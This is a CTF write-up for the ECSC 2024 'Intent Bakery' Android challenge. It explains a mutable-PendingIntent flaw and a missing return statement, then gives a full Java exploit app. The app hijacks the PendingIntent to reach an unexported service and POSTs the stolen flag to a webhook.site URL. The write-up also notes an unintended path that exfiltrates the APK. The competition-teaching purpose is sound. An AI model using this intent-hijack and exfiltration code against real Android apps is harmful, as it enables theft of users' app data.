# ECSC 2024 - Jeopardy

## [misc] Intent Bakery (5 solves)

For this challenge you are required to upload an APK to exploit the vulnerability in the provided APK. Your application
must have its package name as `it.ecsc2024.jeopardy.exploit` and a launchable activity at
`it.ecsc2024.jeopardy.exploit.MainActivity`.

The emulator runs Android 34 and installs the vulnerable application and then launches yours. It may require up to two
minutes to start therefore it is normal for the web page to return 500.

On systems with SELinux enabled, you may need to run `sudo setsebool -P selinuxuser_execheap 1` for the emulator to run
properly.

Author: Gianluca Altomani <@devgianlu>, Vincenzo Bonforte <@Bonfee>

## Overview

The challenge is composed of one exported service (`RecipeService`) and multiple unexported services. Together they
allow to manage recipes and the list of their ingredients. The objective of the challenge is to call the
`AddSecretIngredientService` service to add the flag to your recipe.

## Solution

The `RecipeService` handles messages with an `android.os.Messenger` that, based on the message `what` field, returns a
`PendingIntent` pointing to the internal service that will handle the action. The pending intent is created with
`FLAG_MUTABLE` which makes it so that the application receiving the pending intent can edit it before sending it. Since
pending intents behave like they have been sent from the application that created it (not the one sending them) it can
cause security problems if sensible fields are editable (not already set by the original application).

The code inside `handleMessage` always sets the package name restricting what can be called. For each action it also
sets the class name to that of the service responsible for making that operation. However, it doesn't set it if the add
secret ingredient action is requested with a wrong secret because of a missing return statement.

This allows a malicious application to set the class name to that of the secret service. In order for the intent to be
sent to the correct service it is also required to set the action field of the intent.

The final chain to exploit is the following:

- Create a new recipe
- Add the secret ingredient to the recipe by exploiting the vulnerability
- List the recipes
- Exfiltrate the flag using a webhook

## Exploit

```java
package it.ecsc2024.jeopardy.exploit;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;

import androidx.annotation.Nullable;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.atomic.AtomicReference;
import java.util.function.Consumer;

public final class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    private Messenger mService = null;
    private ReplyHandler mReplyHandler;
    private Messenger mReplyTo;
    private Consumer<Bundle> mCallback;
    private final ServiceConnection mConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mService = new Messenger(service);
            Log.d(TAG, "Service connected");

            new Thread(() -> exploit()).start();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            mService = null;
            Log.d(TAG, "Service disconnected");
        }
    };

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }

    private void exploit() {
        Bundle createData = new Bundle();
        createData.putString("name", "1337");
        createData.putString("description", "get pwned");
        Bundle createdRecipe = callService(1 /* MSG_CREATE_RECIPE */, createData, null);
        Log.d(TAG, "Created recipe ID = " + createdRecipe.getInt("id"));

        Bundle secretData = new Bundle();
        secretData.putString("secret", "wrong");
        callService(5 /* MSG_ADD_SECRET_INGREDIENT */, secretData, intent -> {
            intent.setAction("it.ecsc2024.jeopardy.chall.ADD_SECRET_INGREDIENT_SERVICE");
            intent.setClassName("it.ecsc2024.jeopardy.chall", "it.ecsc2024.jeopardy.chall.services.AddSecretIngredientService");
            intent.putExtra("id", createdRecipe.getInt("id"));
        });

        Bundle recipesList = callService(3 /* MSG_LIST_RECIPES */, new Bundle(), null);
        System.out.println(recipesList.getString("recipes"));

        try {
            URL webhookUrl = new URL("https://webhook.site/xxxxxxxxx");
            URLConnection connection = webhookUrl.openConnection();
            connection.setDoOutput(true);

            try (OutputStream os = connection.getOutputStream()) {
                os.write(recipesList.getString("recipes").getBytes());
            }

            try (InputStream is = connection.getInputStream()) {
                is.read();
            }
        } catch (IOException e) {
            Log.e(TAG, "Failed to send webhook request", e);
        }
    }

    private Bundle callService(int what, Bundle data, Consumer<Intent> tweak) {
        if (mService == null) {
            throw new IllegalStateException();
        }

        PendingIntent pendingResult = createPendingResult(
                100,
                new Intent(),
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_UPDATE_CURRENT
        );
        data.putParcelable("intent", pendingResult);

        Message msg = Message.obtain(null, what);
        msg.replyTo = mReplyTo;
        msg.setData(data);

        mReplyHandler.setTweakCallback(tweak);

        AtomicReference<Bundle> respData = new AtomicReference<>();
        mCallback = bundle -> {
            synchronized (respData) {
                respData.set(bundle);
                respData.notify();
            }
        };

        try {
            mService.send(msg);
        } catch (RemoteException e) {
            throw new RuntimeException(e);
        }

        synchronized (respData) {
            try {
                respData.wait();
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }

            return respData.get();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == 100) {
            mCallback.accept(data.getExtras());
            return;
        }

        super.onActivityResult(requestCode, resultCode, data);
    }

    @Override
    protected void onStart() {
        super.onStart();

        mReplyHandler = new ReplyHandler(this);
        mReplyTo = new Messenger(mReplyHandler);

        Intent intent = new Intent();
        intent.setClassName("it.ecsc2024.jeopardy.chall", "it.ecsc2024.jeopardy.chall.RecipeService");
        bindService(intent, mConnection, Context.BIND_AUTO_CREATE);
    }

    static class ReplyHandler extends Handler {
        private final Context applicationContext;
        private Consumer<Intent> mTweak;

        private ReplyHandler(Context context) {
            super(Looper.getMainLooper());
            applicationContext = context.getApplicationContext();
        }

        private void setTweakCallback(Consumer<Intent> cb) {
            mTweak = cb;
        }

        @Override
        public void handleMessage(Message msg) {
            Log.d(TAG, "Received pending intent");

            PendingIntent pendingIntent = msg.getData().getParcelable(
                    "intent",
                    PendingIntent.class
            );
            if (pendingIntent == null) {
                throw new RuntimeException("Missing pending intent");
            }

            Intent other = new Intent();
            if (mTweak != null) {
                mTweak.accept(other);
            }

            try {
                pendingIntent.send(applicationContext, 0, other);
            } catch (PendingIntent.CanceledException e) {
                throw new RuntimeException(e);
            }

            Log.d(TAG, "Launched pending intent");
        }
    }
}
```

## Unintended

The challenge also had a simpler unintended solution which allowed a malicious application to exfiltrate the entire APK
source which contained the flag. It is possible to obtain the application APK location by using the
`PackageManager` [getPackageInfo](https://developer.android.com/reference/android/content/pm/PackageManager#getPackageInfo(java.lang.String,%20int))
API and accessing the `sourceDir` property.
